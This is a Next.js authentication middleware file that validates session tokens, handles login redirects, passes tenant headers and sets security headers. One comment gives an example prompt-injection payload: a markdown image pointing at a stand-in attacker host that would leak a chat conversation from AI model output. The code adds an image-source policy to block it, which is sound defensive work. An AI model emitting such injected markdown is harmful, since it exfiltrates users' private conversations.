import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';
import { TokenManager } from '@/lib/license/token-manager';
import { buildLoginPath, isPortalPagePath } from '@/lib/security/returnTo';

// UI paths that don't require a session cookie.
const PUBLIC_UI_PATHS = [
  '/login',
  '/register',
  '/forgot-password',
  '/reset-password',
];

/** Inject common security headers into every response. */
function applySecurityHeaders(response: NextResponse, pathname = ''): void {
  response.headers.set('X-Content-Type-Options', 'nosniff');
  response.headers.set('X-Frame-Options', 'DENY');
  response.headers.set('X-XSS-Protection', '1; mode=block');
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
  response.headers.set(
    'Permissions-Policy',
    'camera=(), microphone=(self), geolocation=()',
  );
  // HSTS – only effective over HTTPS; max-age = 1 year
  response.headers.set(
    'Strict-Transport-Security',
    'max-age=31536000; includeSubDomains',
  );
  // Portal pages render model output as markdown, and markdown images load on
  // their own: an injected `![](https://attacker/?q=<conversation>)` would leak
  // the chat. Images may only come from this origin (or inline); this is the
  // only directive, so nothing else on the page is affected.
  if (isPortalPagePath(pathname)) {
    response.headers.set('Content-Security-Policy', "img-src 'self' data: blob:");
  }
}

/**
 * Where an unauthenticated visitor is sent. Portal pages (`/p/<key>`) are links
 * people receive and open cold, so they carry the way back through login. Every
 * other path keeps the bare `/login` it always had.
 *
 * `/p/*` is deliberately NOT a dashboard path: the project / no-project
 * redirect lives in the dashboard layout and nothing here ties it to
 * admin-only or licence-gated UI, so a portal user without any project passes
 * once the session cookie is valid.
 */
function loginRedirectPath(request: NextRequest): string {
  const { pathname, search } = request.nextUrl;
  return isPortalPagePath(pathname) ? buildLoginPath(`${pathname}${search}`) : '/login';
}

export async function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl;

  if (PUBLIC_UI_PATHS.some((path) => pathname.startsWith(path))) {
    const response = NextResponse.next();
    applySecurityHeaders(response);
    return response;
  }

  // Get token from cookie
  const token = request.cookies.get('token')?.value;

  if (!token) {
    return NextResponse.redirect(new URL(loginRedirectPath(request), request.url));
  }

  // Verify token
  const payload = await TokenManager.verifyToken(token);

  if (!payload) {
    const response = NextResponse.redirect(new URL(loginRedirectPath(request), request.url));
    response.cookies.delete('token');
    return response;
  }

  // Add user and tenant info to downstream request headers
  const requestHeaders = new Headers(request.headers);
  const tenantDbName =
    payload.tenantDbName ||
    (payload.tenantSlug ? `tenant_${payload.tenantSlug}` : undefined);

  if (!tenantDbName) {
    return NextResponse.json(
      { error: 'Unauthorized', message: 'Tenant context is missing' },
      { status: 401 },
    );
  }

  requestHeaders.set('x-user-id', payload.userId);
  requestHeaders.set('x-user-email', payload.email);
  requestHeaders.set('x-user-role', payload.role);
  requestHeaders.set('x-tenant-id', payload.tenantId);
  requestHeaders.set('x-tenant-slug', payload.tenantSlug);
  requestHeaders.set('x-tenant-db-name', tenantDbName);
  const licenseExpired = payload.licenseExpiresAt
    ? Date.parse(payload.licenseExpiresAt) <= Date.now()
    : false;

  requestHeaders.set('x-license-type', licenseExpired ? 'FREE' : payload.licenseType);
  requestHeaders.set('x-features', JSON.stringify(payload.features));
  requestHeaders.set('x-request-id', crypto.randomUUID());

  const response = NextResponse.next({
    request: {
      headers: requestHeaders,
    },
  });
  applySecurityHeaders(response, pathname);
  return response;
}

export const config = {
  // `/p/*` (portal pages) falls inside this matcher: only the prefixes listed
  // below are excluded, and there is a unit test that pins it.
  matcher: [
    /*
     * Match all request paths except for the ones starting with:
     * - api (handled by the custom Fastify server)
     * - _next/webpack-hmr (dev-mode Fast Refresh websocket — mixing Next
     *   Middleware with a raw upgrade-track request breaks the handshake;
     *   there's nothing to protect here anyway, it carries no data)
     * - _next/static (static files)
     * - _next/image (image optimization files)
     * - favicon.ico (favicon file)
     * - public static assets (images/fonts)
     */
    '/((?!api|_next/webpack-hmr|_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp|woff|woff2|ttf|otf|eot)$).*)',
  ],
};
